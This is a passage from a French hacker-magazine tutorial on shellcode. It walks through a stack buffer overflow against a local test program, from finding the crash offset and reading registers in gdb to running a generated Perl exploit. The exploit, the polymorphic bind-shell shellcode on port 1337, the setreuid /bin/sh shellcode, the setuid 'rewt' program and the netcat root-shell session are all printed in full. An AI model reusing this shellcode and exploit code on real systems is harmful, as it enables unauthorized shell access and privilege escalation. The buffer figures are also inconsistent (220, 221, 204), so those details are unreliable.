+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	vuln1 : buffer overflow
+	06926:
+	06926:  initialize program: ./vuln1
+	06926:
+	Segmentation fault
+
+Et le voilà qu'il segfault le chacal ...
+
+	[bleyme@localhost Desktop]$ ./vuln1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	vuln1 : buffer overflow
+	Segmentation fault
+
+A combien de "a" le prog segfault exactement ... on va utiliser perl et sa multiplication pour
+le savoir. Cela s'utilise ainsi : ./prog-vuln `perl -e 'print "a"x[nbr]'`
+
+	[bleyme@localhost Desktop]$ ./vuln1 `perl -e 'print "a"x500'`
+	vuln1 : buffer overflow
+	Segmentation fault
+
+	[bleyme@localhost Desktop]$ ./vuln1 `perl -e 'print "a"x300'`
+	vuln1 : buffer overflow
+	Segmentation fault
+
+	[bleyme@localhost Desktop]$ ./vuln1 `perl -e 'print "a"x200'`
+	vuln1 : buffer overflow
+
+
+	[bleyme@localhost Desktop]$ ./vuln1 `perl -e 'print "a"x250'`
+	vuln1 : buffer overflow
+	Segmentation fault
+
+	[bleyme@localhost Desktop]$ ./vuln1 `perl -e 'print "a"x220'`
+	vuln1 : buffer overflow
+	06926:
+	06926:  initialize program: ./vuln1
+	06926:
+
+	[bleyme@localhost Desktop]$ echo maaw
+	maaw 
+
+Mmh, ce maaw signifie que je suis content, j'ai trouvé : 220.
+Cela signifie que EIP est écrasé après 220 bytes
+On a la confirmation que notre petit programme est bien vulnérable à un buffer overflow, on va
+alors sortir un debugger digne de ce nom : gdb.
+et voir un peu ce qu'il se passe au niveau de la pile, lorsqu'on "run" les mêmes opérations en 
+perl.
+
+		
+	[bleyme@localhost Desktop]$ gdb vuln1
+
+	(gdb) run `perl -e 'print "A"x220'`
+	Starting program: /ramdisk/home/bleyme/Desktop/bof/vuln1 `perl -e 'print "A"x220'`
+	vuln1 : buffer overflow
+	09720:
+	09720:  initialize program: /home/bleyme/Desktop/vuln1
+	09720:
+	(no debugging symbols found)...(no debugging symbols found)...
+	Program received signal SIGSEGV, Segmentation fault.
+	0x40033a16 in __libc_start_main () from /lib/libc.so.6
+	(gdb) info reg
+	eax            0x53     83
+	ecx            0xbffff8a0       -1073743712
+	edx            0x8      8
+	ebx            0x4012b020       1074966560
+	esp            0xbffffb40       0xbffffb40
+	ebp            0x41414141       0x41414141
+	esi            0x400098bc       1073780924
+	edi            0xbffffb94       -1073742956
+	eip            0x40033a16       0x40033a16
+	eflags         0x10282  66178
+	cs             0x23     35
+	ss             0x2b     43
+	ds             0x2b     43
+	es             0x2b     43
+	fs             0x0      0
+	gs             0x0      0
+	fctrl          0x37f    895
+	fstat          0x0      0
+	ftag           0xffff   65535
+	fiseg          0x0      0
+	fioff          0x0      0
+	foseg          0x0      0
+	fooff          0x0      0
+	fop            0x0      0
+	mxcsr          0x1f80   8064
+	orig_eax       0xffffffff       -1
+
+	(gdb) quit
+	A debugging session is active.
+	Do you still want to close the debugger?(y or n) y	
+
+	[bleyme@localhost Desktop]$ 
+
+
+On peut récuperer alors "ret" :
+ --> esp  0xbffffb40 
+On va alors pouvoir commencer à coder l'exploit, nous le ferons en perl, certains m'ont
+demandé pour qu'il en soit ainsi, de toute facon, le principe reste le même. L'exploit est
+totalement pourri, il va juste nous servir à illustrer notre shellcode, et l'exploitation
+de buffer/stack overflow.
+
+Je pense qu'on a peu pres tout pour faire notre exploit :
+
+ - Le nop = 0x90 comme toujours.
+ - ret = 0xbffffb40.
+   l'adresse qui va pointer sur la prochaine fonction
+ - buffer = 220.
+ - Le shellcode : ouvre le port 1337.
+
+Go to utilisation de machiavel, un petit sploitgen pratique que j'ai fais en perl.
+Le code source ne sera pas distribué pour le moment.
+
+--
+
+	[bleyme@localhost machiavel]$ chmod +x machiavel
+	[bleyme@localhost machiavel]$ ls
+	machiavel
+	[bleyme@localhost machiavel]$ ./machiavel
+
+	-------------------------------------------------------
+	            machiavel 1.0 coded by bleyme
+	-------------------------------------------------------
+	Machiavel est un petit tool qui génère un exploit qu'on
+	appelle très souvent vuln-dev. [version alpha]
+	Voici ce qu'il peut génèrer :
+
+        --[0] buffer overflow exploit - type 1
+	--[1] buffer overflow exploit - type 2
+        --[2] buffer overflow exploit - type 3
+
+        --[3] stack overflow exploit - type 1
+        --[4] stack overflow exploit - type 2
+
+        --[5] heap overflow exploit - type 1
+        --[6] heap overflow exploit - type 2
+
+        --[7] format bug exploit - type 1
+        --[8] format bug exploit - type 2
+        --[9] ret-into-libc exploit
+  
+
+	Plusieurs shellcodes vous seront proposés lors des
+	questions. Cela va du shellcode basique, en passant par
+	de l'alphanumérique à l'anti-ids.
+	-------------------------------------------------------
+	            machiavel 1.0 coded by bleyme
+	-------------------------------------------------------
+
+	[+] Quel type de vuln-dev voulez vous exploiter ? [0 to 9] : 1
+	[+] localisation du programme : /home/bleyme/c/bof/vuln1
+	[~] vuln1
+
+ 	       --[1] bin/sh shellcode
+ 	       --[2] mkdir shellcode
+ 	       --[3] anti-ids shellcode
+ 	       --[4] alphanumeric execve shellcode
+ 	       --[5] setuid execve shellcode
+ 	       --[6] polymorphic shellcode bind shellcode
+ 	       --[7] polymorphic shellcode connectback shellcode
+
+	[+] shellcodes (1 to 7): 6
+	[~] 6
+
+	[+] Taille du buffer : 221
+	[~] 221
+
+	[+] Offset : 0
+	[~] 0
+
+	[+] Adresse de retour : 0xbffffb40
+	[~] 0xbffffb40
+
+	[+] egg : 10000
+	[~] 10000
+
+	[+] Nom de votre exploit : sploit.pl
+	[~] sploit.pl
+
+	l'exploit buffer overflow a ete genere.
+
+
+--
+
+L'exploit enfin généré, on peut l'afficher ici pour que vous puissiez le voir, j'ai un
+peu commenté, à vous de comprendre le code perl.
+
+	[bleyme@localhost machiavel]$ cat sploit.pl
+
+	#!/usr/bin/perl
+
+	# - sploit.pl
+	# - exploit très simpliste illustrant l'exploitation de buffer overflow.
+	# - local exploit
+	# - Linux
+	# - Bindshell polymorphique sur le port 1337
+
+	$shellcode =
+
+		"\xeb\x06\x5d\x40\xeb\x07\x51\x59\xe8\xf5\xff\xff\xff\x49\x41" .
+		"\xfd\x83\xc5\x26\x26\x89\xef\x4a\x42\x31\xc9\xb1\x5c\x31\xdb" .
+		"\xb3\xfe\x48\x40\x89\xee\x48\x40\xfc\x8a\x06\x46\x30\xd8\xfe" .
+		"\xc3\xaa\x89\xd2\xe2\xf4" .
+		"\xcf\x3f\x99\xb1\x64\x51\x46\x57\x44\x55\x81\xe8\x60\x0a\x57" .
+		"\xc0\x8e\x86\xd7\x88\x40\x75\x7c\x10\x2f\x54\x7e\x4a\x93\xfa" .
+		"\x76\x0d\x4f\x4f\xa9\xc0\x92\x45\xe9\xa5\x96\x41\x9b\x2d\xe7" .
+		"\xab\x7c\x7a\xa7\xce\x73\x81\x54\xfe\xb4\x04\xff\x86\x3b\xaa" .
+		"\x73\x8b\x03\xf0\xbe\xba\x89\x34\xb5\x72\x84\xf5\x4d\x16\x20" .
+		"\x66\x65\x38\x24\x25\x61\x2d\x39\x3f\xdb\xb0\x05\x06\xdf\xb6" .
+		"\x95\xd9";
+
+
+	# informations
+	
+	$ret = 0xbffffb40;
+	# Mettre ici l'addr de retour. Nous avons pu la trouver grace
+	# gdb en faisant un info reg.
+
+	$buffer = 221;
+	# Nous avons pu voir que le segfault commençait à partir de 204
+	
+	$oe = 10000;
+
+	$nops = "\x90";
+	# On spéficie les NOPs.
+	
+	$offset = 0;
+	# l'offset est ici de 0.
+	
+	if (@ARGV == 1)
+	
+	        {
+	                $offset = $ARGV[0];
+	        }
+
+	$addr = pack('l', ($ret + $offset));
+	for ($i = 0; $i < $buffer; $i += 4)
+
+	        {
+	                $tamp .= $addr;
+	        }
+
+	for ($i = 0; $i < ($oe - length($shellcode) - 100); $i++)
+
+ 	       {
+ 	               $tamp .= $nops;
+ 	       }
+
+	$tamp .= $shellcode;
+	exec("./vuln1", $tamp,0);
+
+
+	[bleyme@localhost Desktop]$ chmod +x sploit.pl
+
+	[bleyme@localhost Desktop]$ ./sploit.pl
+	vuln1 : buffer overflow
+	[Attente]
+
+Maintenant, on va mettre un shellcode setreuid() :
+
+char shellcode[] =
+
+"\x31\xc0"         // xor %eax,%eax 
+"\xb0\x46"         // mov $0x46,%al 
+"\x31\xdb"         // xor %ebx,%ebx 
+"\x31\xc9"         // xor %ecx,%ecx 
+"\xcd\x80"         // int $0x80 
+"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31" 
+"\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+main() 
+{ 
+   int *ret; 
+ 
+   ret = (int *)&ret + 2; 
+   (*ret) = (int)shellcode; 
+} 
+
+On compile : 
+
+	[bleyme@localhost Desktop]$ gcc -o rewt rewt.c
+	[bleyme@localhost Desktop]$ chmod +4577 rewt
+	[bleyme@localhost Desktop]$ su
+
+	[root@localhost Desktop]$ chown root rewt
+	[root@localhost Desktop]$ exit
+	[bleyme@localhost Desktop]$ exit
+
+Dans un autre shell (shift+ctrl+t), on se connect via netcat :
+(nous voilà alors connected au port 1337 grace au shellcode executé par le buffer
+overflow.)
+
+	[bleyme@localhost Desktop]$ nc localhost 1337
+	
+	ls
+	rewt rewt.c sploit.pl vuln1 vuln1.c
+	whoami
+	bleyme
+	./rewt
+	whoami
+	root
+	echo maaw !
+	maaw !
+
+Voila, c'était histoire d'avoir un shellroot à la fin, sinon ça ne sert pas à grand chose
+de faire cela, on aurait pu mettre un setuid dans l'exploit et basta.
+	
+
+
+	---[ 13 ]   References.
+
+
+Des références sur les shellcodes, il en existe des tas, on va néanmoins enumérer les
+plus intéressantes :
+
+- phrack - clet-team - http://www.phrack.org/phrack/61/p61-0x09_Polymorphic_Shellcode_Engine.txt
+- phrack - sk - http://www.phrack.org/phrack/62/p62-0x07_Advances_in_Windows_Shellcode.txt
+- phrack - obscou - http://www.phrack.org/phrack/61/p61-0x0b_Building_IA32_UnicodeProof_Shellcodes.txt
+- phrack - anonymous - http://www.phrack.org/phrack/59/p59-0x0c.txt
+- phrack - johnny cyberpunk - http://www.phrack.org/phrack/59/p59-0x0d.txt
+- phrack - papasutra - http://www.phrack.org/phrack/57/p57-0x05
+- adm - k2 - http://adm.freelsd.net/ADM/ADMmutate-0.7.3.tar.gz
+- misc-mag - Olivier Dembour - http://www.miscmag.com/articles/index.php3?page=909
+- http://www.shellcode.com.ar/
+- http://shellcode.org/
+- l0t3k - http://www.l0t3k.org/programming/docs/shellcode/
+- l0t3k - http://www.l0t3k.net/tools/ShellCode/
+- milw0rm - http://www.milw0rm.com/shellcode2.php
+
+Ces articles/repository sont les références, en les lisant bien, vous pouvez apprendre rapidement
+les shellcodes sous environnement linux/bsd/win32. Il en existe une quantité énorme, je n'ai pas pu
+mettre tous les liens. Puisque la majorité de ces articles proviennent du magazine phrack, vous
+pouvez consulter les documents traduits sur phrack-fr (60 & 61) par le "crou" Degenere-Sciences,
+disponible sur OUAH.org.
+
+
+
+	---[ 14 ]   auteurs.
+
+Cet article a été écrit par bleyme dans le seul but de s'amuser et d'apprendre à quelques personnes 
+le maniement général des shellcodes, j'appelle ça une petite conclusion de ce qui existe déjà.
+J'aimerai remercier emp' qui sans lui l'article ne serait absolument pas comme ça, il l'a nettement
+amélioré.
+
+	---[ 15 ]   conclusion.
+
+Je suis sincérement désolé d'avoir dû un peu bacler l'article (dans le sens ou des erreurs peuvent
+s'y trouver), parce que le mag devait sortir, on a suffisament fait patienter de personnes, on
+s'en excuse, mais aussi par manque cruel de temps. vous pouvez me mailer pour les éventuelles
+mise à mort a mon sujet a cette adresse :
+
+bleyme@netcourrier.com
+
+ou sur irc.geeknode.org ou irc.freenode.net : en /query : bleyme ou bleyme|aw =)
+rdv sur un cactus!
+
+    -- [ bleyme
